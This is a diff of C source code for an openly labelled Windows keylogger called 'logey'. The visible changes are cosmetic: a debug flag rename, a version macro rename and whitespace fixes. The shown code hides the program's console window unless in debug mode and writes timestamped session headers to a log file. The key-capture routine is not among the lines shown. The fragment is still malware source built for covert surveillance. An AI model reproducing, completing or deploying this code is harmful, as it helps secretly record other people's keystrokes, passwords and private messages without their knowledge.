@@ -3,7 +3,7 @@
 
 int main() {
 
-	if (!debug) hideConsole();
+	if (!DEBUG) hideConsole();
 
 	createNewInstanceHeader("logey.log");
 
@@ -74,16 +74,16 @@ void hideConsole() {
 	ShowWindow(hideConsole, 0);
 }
 
-void createNewInstanceHeader(char *filename){
+void createNewInstanceHeader(char *filename) {
 	time_t currentTime;
-	time(&currentTime);
+	time(&currentTime);	
 
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(filename, "a+");
 
 	fprintf(OUTPUT_FILE, "%s", "\n------------------");
-	fprintf(OUTPUT_FILE, "%s %.2f", "\nlogey --- a Windows keylogger\nauthor: exler\nlicense: MIT\nVersion:", LOGEY_VERSION_NUMBER);
-	fprintf(OUTPUT_FILE, "%s", "\n\nSession Timestamp : ");
+	fprintf(OUTPUT_FILE, "%s %.2f", "\nlogey --- a Windows keylogger\nauthor: exler\nlicense: MIT\nVersion:", LOGEY_VERSION);
+	fprintf(OUTPUT_FILE, "%s", "\n\nSession Timestamp: ");
 	fprintf(OUTPUT_FILE, "%s", ctime(&currentTime));
 	fprintf(OUTPUT_FILE, "%s", "\n------------------\n");
 
